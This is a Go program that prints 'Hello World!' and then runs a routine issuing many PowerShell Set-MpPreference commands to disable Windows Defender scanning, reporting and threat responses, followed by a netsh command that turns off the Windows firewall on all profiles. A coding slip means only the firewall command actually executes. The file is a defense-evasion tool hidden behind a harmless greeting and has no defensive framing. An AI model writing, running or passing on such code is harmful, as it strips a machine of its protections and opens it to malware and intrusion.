// meow
package main

import (
	"fmt"
	"os/exec"
)

func d1() {
	c := exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true")
	c = exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -EnableControlledFolderAccess Disabled")
	c = exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -PUAProtection disable")
	c = exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true")
	c = exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -DisableBehaviorMonitoring $true")
	c = exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -DisableBlockAtFirstSeen $true")
	c = exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -DisableIOAVProtection $true")

	c = exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -DisablePrivacyMode $true")
	c = exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true")
	c = exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -DisableArchiveScanning $true")
	c = exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -DisableIntrusionPreventionSystem $true")

	c = exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -DisableScriptScanning $true")
	c = exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -SubmitSamplesConsent 2")
	c = exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -MAPSReporting 0")
	c = exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -HighThreatDefaultAction 6 -Force")

	c = exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -ModerateThreatDefaultAction 6")
	c = exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -LowThreatDefaultAction 6")
	c = exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -SevereThreatDefaultAction 6")
	c = exec.Command("cmd", "/C", "powershell", "-Command", "Set-MpPreference -ScanScheduleDay 8")
	c = exec.Command("cmd", "/C", "netsh advfirewall set allprofiles state off")

	output, err := c.CombinedOutput()
	if err != nil {
		fmt.Println("[-] You need to run with Administrator rights")
	} else {
		fmt.Println(string(output))
	}
}

func main() {
	fmt.Println("Hello World!")
	d1()
}
